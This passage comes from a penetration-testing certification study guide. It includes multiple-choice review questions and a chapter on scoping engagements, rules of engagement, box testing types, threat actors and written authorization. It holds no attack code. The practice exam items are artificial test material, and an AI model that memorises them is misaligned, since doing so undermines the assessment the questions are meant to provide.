+D. Jack the Ripper
+16. Which one of the following vulnerability scanners is specifically designed to test the  
+security of web applications against a wide variety of attacks?
+A. OpenVAS
+B. Nessus
+C. sqlmap
+D. Nikto
+
+Review Questions  29
+17. Which one of the following debugging tools does not support Windows systems?
+A. GDB
+B. OllyDbg
+C. WinDbg
+D. IDA
+18. What is the final stage of the Cyber Kill Chain?A.
+ Weaponization
+B. Installation
+C. Actions on Objectives
+D. Command and Control
+19. Which one of the following activities assumes that an organization has already been  
+compromised?
+A. Penetration testing
+B. Threat hunting
+C. Vulnerability scanning
+D. Software testing
+20. Alan is creating a list of recommendations that his organization can follow to remediate 
+issues identified during a penetration test. In what phase of the testing process is Alan  participating?
+A.
+ Planning and Scoping
+B. Reporting and Communicating Results
+C. Attacking and Exploiting
+D. Information Gathering and Vulnerability Identification
+
+Chapter 
+2Planning and Scoping 
+Penetration Tests
+ThiS cha PTer cover S The following 
+PenTe ST+ exam ToPicS:
+Domain 1: Planning and Scoping
+✓ ✓1.1 Explain the importance of planning for an 
+engagement.
+✓■Understanding the target audience
+✓■Rules of engagement
+✓■Communication escalation path
+✓■Resources and requirements
+✓■Confidentiality of findings
+✓■Known vs. unknown
+✓■Budget
+✓■Impact analysis and remediation timelines
+✓■Disclaimers
+✓■Point-in-time assessment
+✓■Comprehensiveness
+✓■Technical constraints
+✓■Support resources
+✓■WSDL/WADL
+✓■SOAP project file
+✓■SDK documentation
+✓■Swagger document
+✓■XSD
+✓■Sample application requests
+✓■Architectural diagramCompTIA® PenTest+ Study Guide: Exam PT0-001 
+By Mike Chapple and David Seidl  
+Copyright © 2019 by John Wiley & S ons, Inc., Indianapolis, Indiana 
+ 
+
+✓ ✓1.2 Explain key legal concepts.
+✓■Contracts
+✓■SOW
+✓■MSA
+✓■NDA
+✓■Environmental differences
+✓■Export restrictions
+✓■Local and national government restrictions
+✓■Corporate policies
+✓■Written authorization
+✓■Obtain signature from proper signing authority
+✓■Third-party provider authorization when necessary
+✓ ✓1.3 Explain the importance of scoping an engagement 
+properly.
+✓■Types of assessments
+✓■Goals-based/objectives-based
+✓■Compliance-based
+✓■Red team
+✓■Special scoping considerations
+✓■Premerger
+✓■Supply chain
+✓■Target selection
+✓■Targets
+✓■Internal
+✓■On-site vs. off-site
+✓■External
+✓■First-party vs. third-party hosted
+✓■Physical
+✓■Users
+✓■SSIDs
+✓■Applications
+
+✓■Considerations
+✓■White-listed vs. black-listed
+✓■Security exceptions
+✓■IPS/WAF whitelist
+✓■NAC
+✓■Certificate pinning
+✓■Company’s policies
+✓■Strategy
+✓■Black box vs. white box vs. gray box
+✓■Risk acceptance
+✓■Tolerance to impact
+✓■Scheduling
+✓■Scope creep
+✓■Threat actors
+✓■Adversary tier
+✓■APT
+✓■Script kiddies
+✓■Hacktivist
+✓■Insider threat
+✓■Capabilities
+✓■Intent
+✓■Threat models
+✓ ✓1.4 Explain the key aspects of compliance-based 
+assessments.
+✓■Compliance-based assessments, limitations, and caveats
+✓■Rules to complete assessment
+✓■Password policies
+✓■Data isolation
+✓■Key management
+✓■Limitations
+✓■Limited network access
+✓■Limited storage access
+✓■Clearly defined objectives based on regulations
+
+The Planning and Scoping domain of the CompTIA PenTest+ 
+certification exam objectives deals with preparing for, plan-ning, and scoping a penetration test. It explores the types of 
+assessment, rules of engagement, resources, and audiences that a tester may encounter. In this chapter you will examine how to scope an assessment; the legal, technical, and other considerations you need to account for while planning it; and how this relates to threat actors your target organization may face. We will also look at compliance-based assess-ments, what they require, and what limitations they can create.
+navigating compliance requirements
+Karen’s organization processes credit cards at multiple retail locations spread throughout 
+a multi-state area. As the security analyst for her organization, Karen is responsible for conducting a regular assessment of the card processing environment.
+Karen’s organization processes just over 500,000 transactions a year. Because the orga-
+nization processes transactions, it is subject to adhering to Payment Card Industry Data Security Standard (PCI DSS) requirements. It also exclusively uses hardware payment terminals that are part of a PCI SSC (Security Standards Council) listed point-to-point encryption (P2PE) solution without cardholder data storage. That means that her orga-nization must provide an annual Self-Assessment Questionnaire (SAQ), have a quarterly network scan run by an Approved Service Vendor (ASV), and fill out an Attestation of Compliance form. The Attestation includes a requirement that the Report on Compliance be done based on the PCI DSS Requirements and Security Assessment Procedures that currently cover her company.
+As a penetration tester, you need to be able to determine what requirements you may 
+have to meet for a compliance-based assessment. Using the information above, can you figure out what Karen’s assessment process will require? You can start here:
+https://www.pcisecuritystandards.org/document_library
+
+Scoping and Planning Engagements  35
+ A few questions to get you started: 
+✓ ■   What type of penetration test would you recommend to Karen? A white box, gray 
+box, or black box test? Why? 
+✓ ■   How would you describe the scope of the assessment? 
+✓ ■   What rules of engagement should you specify for the production card processing systems Karen needs to have tested? 
+✓ ■   What merchant level does Karen’s organization fall into? 
+✓ ■   What Self-Assessment Questionnaire (SAQ) level is Karen’s company most likely cov-ered by, and why? 
+✓ ■   What questions in the SAQ are likely to be answered NA based on the solution described? 
+✓ ■   Is Karen’s team required to perform vulnerability scans of card processing systems in her environment?       
+ Scoping and Planning Engagements 
+ The fi  rst step in most penetration testing engagements is determining what should be 
+tested, or the  scope   of the assessment. The scope of the assessment determines what pen-
+etration testers will do and how their time will be spent. 
+ Determining the scope requires working with the person or organization for whom the pen-
+etration test will be performed. Testers need to understand all of the following: why the test is being performed; whether specifi  c requirements such as compliance or business needs are driv-ing the test; what systems, networks, or services should be tested and when; what information can and cannot be accessed during testing; what the rules of engagement for the test are; what techniques are permitted or forbidden; and to whom the fi  nal report will be presented. 
+        
+ The Penetration Testing Execution Standard at  www.pentest-standard.org   
+is a great resource for penetration testers. It includes information about 
+preengagement interactions like those covered in this chapter as well as detailed breakdowns of intelligence gathering, threat modeling, vulner-ability analysis, exploitation and postexploitation activities, and reporting. The team that built it also created a technical guideline that can be useful, although some of the material is slightly dated. It’s available at 
+http://www.pentest-standard.org/index.php/
+PTES_Technical_Guidelines      
+
+36 Chapter 2 ■ Planning and Scoping Penetration Tests
+ Assessment Types 
+ There are quite a few ways to categorize and describe assessments, but it helps to have some 
+broad categories to sort them into. The PenTest+ exam objectives describe three major types of assessment: 
+✓ ■Goals-based   or  objectives-based assessments   are conducted for specific reasons. 
+Examples include validation of a new security design, testing an application or service infrastructure before it enters production, and assessing the security of an organization that has recently been acquired. 
+✓ ■Compliance-based assessments   are designed around the compliance objectives of a 
+law, standard, or other guidance and may require engaging a specific provider or asses-sor that is certified to perform the assessment. 
+✓ ■Red-team assessments   are typically more targeted than normal penetration tests. Red 
+teams attempt to act like an attacker, targeting sensitive data or systems with the goal of acquiring data and access. Unlike other types of penetration tests, red-team assess-ments are not intended to provide details of all of the security flaws a target has. This means that red-team assessments are unlikely to provide as complete a view of flaws in the environment, but they can be very useful as a security exercise to train incident responders or to help validate security designs and practices.   
+        
+ Red teams test the effectiveness of a security program or system by acting 
+like attackers. Red teams are sometimes called tiger teams. Blue teams are defenders and may operate against red teams or actual attackers. 
+ Some security professionals also describe other colors of teams, such as 
+purple teams that work to integrate red- and blue-team efforts to improve organizational security, white teams that control the environment during an exercise, or green teams that tackle long-term vulnerability remediation or act as trainers.     
+ White Box, Black Box, or Gray Box? 
+ Once the type of assessment is known, one of the fi  rst things to decide about a penetration 
+test is how much knowledge testers will have about the environment. There are three typi-cal classifi  cations that are used to describe this:   
+✓ ■White box   tests, sometimes called “crystal box” or “full knowledge” tests, as in you 
+see everything inside, are performed with full knowledge of the underlying technol-ogy, configurations, and settings that make up the target. Testers will typically have information including network diagrams, lists of systems and IP network ranges, and even credentials to the systems they are testing. White box tests allow effective testing of systems without requiring testers to spend time identifying targets and determin-ing which of them may allow a way in. This means that a white box test is often more 
+
+Scoping and Planning Engagements  37
+complete, as testers can get to every system, service, or other target that is in scope and 
+will have credentials and other materials that will allow them to be tested. Of course, since testers can see everything inside an environment, they may not provide an accu-rate view of what an external attacker would see, and controls that would have been effective against most attackers may be bypassed.
+✓■Black box  tests, sometimes called “zero knowledge” tests, are intended to replicate 
+what an attacker would encounter. Testers are not provided with access to or infor -
+mation about an environment, and instead, they must gather information, discover vulnerabilities, and make their way through an infrastructure or systems as an attacker would. This can be time-consuming for the penetration tester, but it can bet-ter reveal what vulnerabilities might be exploited by someone starting with nothing. It can also help provide a reasonably accurate assessment of how secure the target is against an attacker of similar or lesser skill. It is important to note that the quality and skill set of your penetration tester or team is very important when conducting a black box penetration test—if the threat actor you expect to target your organization is more capable, a black box tester can’t provide you with a realistic view of what they could do.
+✓■Gray box  tests are a blend of black box and white box testing. A gray box test may 
+provide some information about the environment to the penetration testers without giving full access, credentials, or configuration details. A gray box test can help focus penetration testers’ time and effort while also providing a more accurate view of what an attacker would actually encounter.
+Understanding Your adversaries
+When an organization conducts a black box penetration test, one of the first questions it 
+will ask is, Who would attack us and why? Answering that question can help management make decisions about how a penetration test is conducted, what techniques are consid-ered in the engagement, the scope of the test, and who they will hire to conduct it.
+Threat actors are often rated by their capabilities. For example, script kiddies and casual 
+hackers use prebuilt tools to conduct their attacks, and most organizations will consider their attacks nuisance-level threats. But as you continue down the threat actors adversary tiers shown in Figure 2.1, capabilities and resources, and thus the threat an adversary poses, increase. As professional hackers, organized crime, and nation-state–level attack-ers like advanced persistent threats (APTs) enter your threat radar, the likelihood of a successful attack and compromise increases. This means that you should assume that a breach will occur and plan accordingly!
+Each of these potential adversaries is likely to have a different intent: hacktivists may 
+want to make a political or social point, while black hats and organized crime are likely to 
+
+38 Chapter 2  ■ Planning and Scoping Penetration Tests
+have a profit motive. APT actors are usually focused on a nation-state’s goals, with other 
+attacks driven by that purpose.
+figUre 2.1   Adversary tiers
+Script Kiddies
+Hacktivists & Hacking
+Groups
+Professional
+Black Hats
+Organized
+Crime
+APTS
+The Rules of Engagement
+Once you have determined the type of assessment and the level of knowledge testers will 
+have about the target, the rest of the rules of engagement (RoE) can be written. Key ele-ments include these:
+✓■The timeline for the engagement and when testing can be conducted. Some assessments will intentionally be scheduled for noncritical time frames to minimize the impact of potential service outages, while others may be scheduled during normal business hours to help test the organization’s reaction to attacks.
+✓■What locations, systems, applications, or other potential targets are included or excluded. This also often includes discussions about third-party service providers that may be impacted by the test, such as Internet service providers, Software as a Service or other cloud service providers, or outsourced security monitoring services. Any spe-cial technical constraints should also be discussed in the RoE.
+✓■Data handling requirements for information gathered during the penetration test. This is particularly important when engagements cover sensitive organizational data or systems. Penetration tests cannot, for example, legally expose protected health information (PHI), even under an NDA. Requirements for handling often include confidentiality requirements for the findings, such as encrypting data during and after the test, and contractual require -
+ments for disposing of the penetration test data and results after the engagement is over.
+✓■What behaviors to expect from the target. Defensive behaviors like shunning, black-listing, or other active defenses may limit the value of a penetration test. If the test is meant to evaluate defenses, this may be useful. If the test is meant to test a complete 
+
+Scoping and Planning Engagements  39
+infrastructure, shunning or blocking the penetration testing team’s efforts can waste 
+time and resources.
+✓■What resources are committed to the test. In white and gray box testing scenarios, time commitments from the administrators, developers, and other experts on the targets of the test are not only useful, they can be necessary for an effective test.
+✓■Legal concerns should also be addressed, including a synopsis of any regulatory con-cerns affecting the target organization, pentest team, any remote locations, and any service providers who will be in-scope.
+✓■When and how communications will occur. Should the engagement include daily or weekly updates regardless of progress, or will the penetration testers simply report out when they are done with their work?
+✓■Whom to contact in case of particular events, such as evidence of ongoing compromise, accidental breach of RoE, a critical vulnerability discovered, and other events that war-rant immediate attention.
+✓■Who is permitted to engage the pentest team; for example, can the CFO request an update? Including this in RoE helps avoid potentially awkward denials.
+Permission
+The tools and techniques we will cover in this book are the bread and butter of a penetra-
+tion tester’s job, but they are very likely illegal to use on another owner’s equipment with-out permission. Before you plan (and especially before you execute) a penetration test, you must have appropriate permission. In most cases, you should be sure to have appro-priate documentation for that permission in the form of a signed agreement, a memo from senior management, or a similar “get out of jail free” card from a person or people in the target organization with the rights to give you permission.
+Why is it called a “get out of jail free” card? It’s the document that you would produce if 
+something went wrong. Permission from the appropriate party can help you stay out of trouble if something goes wrong!
+Scoping agreements and the rules of engagement must define more than just what will 
+be tested. In fact, documenting the limitations of the test can be just as important as docu-
+menting what will be included. The testing agreement or scope documentation should contain disclaimers explaining that the test is valid only at the point in time when it is con-ducted and that the scope and methodology chosen can impact the comprehensiveness of the test. After all, a white box penetration test is far more likely to find issues buried layers deep in a design than a black box test of well-secured systems!
+Problem handling and resolution is another key element of the rules of engagement. 
+While penetration testers and clients always hope that the tests will run smoothly and won’t cause any disruption, testing systems and services, particularly in production envi-ronments using actual attack and exploit tools, can cause outages and other problems. In 
+
+40 Chapter 2  ■ Planning and Scoping Penetration Tests
+those cases, having a clearly defined communication, notification, and escalation path on 
+both sides of the engagement can help minimize downtime and other issues for the tar-get organization. Penetration testers should carefully document their responsibilities and limitations of liability and ensure that clients know what could go wrong and that both sides agree on how it should be handled. This ensures that both the known and unknown impacts of the test can be addressed appropriately.
+Scoping Considerations: A Deeper Dive
+As you’ve likely already realized, determining the detailed scope of a test can involve a significant amount of work! Even a small organization may have a complex set of systems, applications, and infrastructure, and determining the scope of a penetration test can be challenging unless the organization has detailed and accurate architecture, dataflow, and system documentation. Of course, if the engagement is a black box test, the detail available to penetration testers may be limited, so they will need to know how to avoid going outside of the intended scope of the test.
+Detailed scoping starts by determining the acceptable targets. Are they internally or 
+externally hosted, and are they on site or off site? Are they hosted by the organization itself, by a third party, or by an Infrastructure as a Service or other service provider? Are they virtual, physical, or a hybrid, and does this impact the assessment?
+Equally important is an understanding of what applications, services, and supporting 
+infrastructure are in scope. It may be desirable or necessary to target elements of infrastruc -
+ture or systems that are not directly related to the target to access the target. For example, one of the authors of this book targeted the network administration infrastructure for an organization to gain access to the real target of the test he was conducting—a database server that was otherwise too well protected by firewalls. With access to network adminis -
+tration functions, he was able to pivot and get access to unencrypted dataflows between the database and application server that were his real target, as shown in Figure 2.2.
+figUre 2.2   A logical dataflow diagram
+Site VisitorLoad
+Balancer TCP 443TCP 1433
+TCP 80Web
+Application
+Server
+Web
+Application
+Server
+Web
+Application
+ServerDatabase
+Database
+
+Scoping and Planning Engagements  41
+ User accounts and privileged accounts are both commonly part of penetration tests, and 
+they can be some of the most important targets for penetration testers. That means deter-
+mining which accounts are in scope and which aren’t. For a black box penetration tester, limitations on accounts can create challenges if you aren’t allowed to use an account that you may be able to access. Of course, with a white box test (and possibly with a gray box test), you should have access to the accounts you need to perform the test. 
+ Wireless and wired network scoping often comes into play for penetration testers who 
+will conduct on-site work, or when the network itself is in scope. Thus it’s important to know which SSIDs belong to your target and which are valid targets. At the same time, knowing which subnets or IP ranges are in scope is also key to avoid targeting third parties or otherwise going outside of the penetration test’s scope. 
+        
+ It is important to keep careful logs of the actions you take while conducting 
+a penetration test. That way, if a problem occurs, you can show what was going on at that time. The authors of this book have used their logs to dem-onstrate which systems were being vulnerability scanned when a service crashed in multiple cases. In some, the scanner wasn’t the cause; in others it was, showing that the service wasn’t up to being scanned!   
+ As you work through all of the details for a scoping exercise, you should also make sure 
+you have an in-depth discussion about the target organization’s risk acceptance and com-
+pany policies. Are the organization and the sponsor ready and able to accept that a penetra-tion test could cause an outage or service disruption? If not, is there a way to conduct the test in a way that will either minimize risk or prevent it? What is the organization’s impact tolerance? Is a complete outage acceptable as part of the test? What if an account lockout happens? Is there a particular time of day or part of the business or recurring IT mainte-nance cycle when a test would be less disruptive? 
+ The PenTest+ objectives specifi  cally call out pre-merger and supply chain tests as busi-
+ness areas that a penetration tester may be asked to review. In pre-merger scenarios, the penetration test is typically intended to help the acquiring company understand the security capabilities and status of the acquired company. Supply chain testing, on the other hand, is usually targeted at companies and organizations that the client organization wants to review to determine if suppliers have effective security controls in place. It is common prac-tice to ask suppliers to provide audit and assessment documentation, so you might also be asked to provide an assessment suitable for sharing with prospective customers or partners. 
+ In addition to these specifi  c business reasons, a complete scope review for a customer 
+or organization is likely to include at least some discussion of business processes and prac-tices that the tester may encounter. These could include administrative processes, account management, or any other business process that the tester might target or disrupt as part of their testing process. As a penetration tester, make sure that you discuss the potential for impact, and inquire about any processes that should be treated with care or avoided. 
+ Scope creep, or the addition of more items and targets to the scope of the assessment, 
+is a constant danger for penetration tests. During the scoping phase, you are unlikely to 
+
+42 Chapter 2  ■ Planning and Scoping Penetration Tests
+know all of the details of what you may uncover, and during the assessment itself you may 
+encounter unexpected new targets. It is important to ensure that you have planned for this with the sponsor of the penetration test and know how you will handle it. They may opt to retain the original scope, engage you to perform further work, or request an estimate on the new scope.
+Support Resources for Penetration Tests
+Penetration testers can take advantage of internal documentation to help plan their test-ing (and black box testers may manage to acquire this documentation during their work!). While there are a multitude of possible documents that each organization may have, docu-mentation, accounts and access, and budget are all specifically described in the PenTest+ objectives.
+Documentation
+The documentation that an organization creates and maintains to support its infrastructure and services can be incredibly useful to a penetration tester. While there are a multitude of possible documents that each organization may have, a few of the most common are described in the PenTest+ objectives, including these:
+✓■XML documentation like Web Services Description Language (WSDL) , Web 
+Application Description Language (WADL) , SOAP , or other XML -based schema 
+definitions. There are a multitude of XML-based standards that penetration testers may encounter. Fortunately, XML code is usually reasonably human-readable, and you should be able to get a general idea of what the definition or documentation describes by reading through it. Figure 2.3 shows an example of Amazon’s Product Advertising WSDL (found at 
+http://webservices.amazon.com/AWSECommerceService/
+AWSECommerceService.wsdl ), which shows value types, operation definitions, and 
+request/response formats.
+figUre 2.3   An example of an API WSDL
+
+
+Scoping and Planning Engagements  43
+✓■Application programming interface (API) documentation describes how software 
+components communicate. While APIs can be described in many ways, including via the Web Services Description Language (WSDL), tools such as Swagger, Apiary, and RAML are some of the most popular ways of developing and documenting the REST-ful APIs that are part of many modern service stacks. So access to a Swagger document provides testers with a good view of how the API works and thus how they can test it.
+✓■Software development kits (SDKs) also provide documentation, and organizations may either create their own SDKs or use commercial or open-source SDKs. Understanding which SDKs are in use, and where, can help a penetration tester test applications and services.
+✓■Internal documentation may also include examples like sample application requests, API examples, or other useful code that testers can use to validate or improve their own testing. This is particularly useful for penetration tests that are directed at web applications or APIs.
+The w3c and xml-Based Standards
+The World Wide Web Consortium (W3C) is an international community organization that 
+defines web standards, including HTML, CSS, XML, web services, and many others. The W3C website at 
+www.w3.org  contains information about each of these standards.
+As a penetration tester, you won’t know every XML-based scheme or markup language you encounter. Fortunately, XML follows a set of standard syntax rules. Classes like w3schools.com’s XML tutorial (
+https://www.w3schools.com/xml/default.asp ) can get 
+you started on reading XML documents if you need a quick tutorial.
+✓■Architectural diagrams, dataflow diagrams, and other system and design documenta-
+tion can provide penetration testers with an understanding of potential targets, how they communicate, and other configuration and design details.
+✓■Configuration files can be treasure troves of information and may contain details including accounts, IP addresses, and even passwords or API keys.
+Access and Accounts
+White box assessments will provide direct access to the systems that are being tested. This may include permitting penetration testers past defenses that are normally in place. A black box assessment team won’t have that luxury and will have to make their way past those defenses. Common security exceptions for white box tests are as follows:
+✓■Whitelisting testers in Intrusion Prevention Systems (IPSs), Web Application Firewalls (WAFs), and other security devices will allow them to perform their tests without being blocked. For a white box test, this means that testers won’t spend time waiting to be 
+
+
+[Note: PDF has 521 pages, only first 100 pages extracted]
